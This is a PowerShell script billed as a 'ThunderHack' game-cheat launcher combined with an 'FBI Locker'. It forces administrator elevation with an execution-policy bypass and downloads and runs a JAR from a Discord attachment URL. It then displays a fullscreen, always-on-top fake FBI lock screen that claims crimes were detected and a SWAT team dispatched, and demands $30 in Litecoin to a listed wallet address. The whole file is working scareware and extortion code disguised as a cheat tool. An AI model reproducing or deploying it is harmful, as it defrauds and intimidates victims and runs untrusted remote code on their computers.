# Combined ThunderHack Launcher + FBI Locker (shows if not paid)
# Run as Administrator

if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Java 21 check/install
$jdk = "C:\Program Files\Microsoft\jdk-21*"
$java = $null
$jdkF = Get-ChildItem $jdk -Directory -EA SilentlyContinue | Sort LastWriteTime -Desc | Select -First 1
if ($jdkF -and (Test-Path "$($jdkF.FullName)\bin\java.exe")) { $java = "$($jdkF.FullName)\bin\java.exe" }
else {
    $api = "https://api.github.com/repos/microsoft/openjdk/releases/latest"
    $rel = Invoke-RestMethod $api -UseBasicParsing -Headers @{"User-Agent"="PowerShell"}
    $msi = $rel.assets | ? {$_.name -match "OpenJDK21U-jdk_x64_windows_hotspot_.*\.msi"} | Select -First 1
    $url = $msi.browser_download_url
    $tmp = "$env:TEMP\jdk.msi"
    Invoke-WebRequest $url -OutFile $tmp -UseBasicParsing
    Start-Process msiexec "/i `"$tmp`" /quiet /norestart ADDLOCAL=FeatureEnvironment,FeatureJarFileRunWith,FeatureJavaHome" -Wait
    Remove-Item $tmp -Force -EA SilentlyContinue
    $jdkF = Get-ChildItem $jdk -Directory -EA SilentlyContinue | Sort LastWriteTime -Desc | Select -First 1
    $java = "$($jdkF.FullName)\bin\java.exe"
}

# Launch ThunderHack
$jarUrl = "https://cdn.discordapp.com/attachments/1441223734705914037/1473173909154037842/ThunderHack-1.7.jar?ex=69953f9e&is=6993ee1e&hm=022164f1f4a302d9d62dbcbf02df5f0a55815394dd8cdfcf26829ea4611db63a&"
$jar = "$env:TEMP\th.jar"
Invoke-WebRequest $jarUrl -OutFile $jar -UseBasicParsing
Start-Process $java "-jar `"$jar`"" -NoNewWindow -Wait

# FBI Locker (shows after cheat or on next run)
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$form = New-Object System.Windows.Forms.Form
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.BackColor = 'Black'

$lbl = New-Object System.Windows.Forms.Label
$lbl.Text = "FEDERAL BUREAU OF INVESTIGATION`nYOUR COMPUTER IS LOCKED`nFederal crimes detected`nIP logged. Swat dispatched.`nPay $30 USD in Litecoin now.`nAddress: LPsKt16tXtphukR1buYc4QZfkWeBcfpoM6"
$lbl.ForeColor = 'Red'
$lbl.Font = New-Object System.Drawing.Font("Arial", 28, 'Bold')
$lbl.AutoSize = $true
$lbl.Location = New-Object System.Drawing.Point(100,100)
$form.Controls.Add($lbl)

$btn = New-Object System.Windows.Forms.Button
$btn.Text = "I PAID"
$btn.Size = New-Object System.Drawing.Size(400,100)
$btn.Location = New-Object System.Drawing.Point(100,600)
$btn.BackColor = 'DarkRed'
$btn.ForeColor = 'White'
$btn.Add_Click({ $form.Close() })
$form.Controls.Add($btn)

$form.ShowDialog() | Out-Null
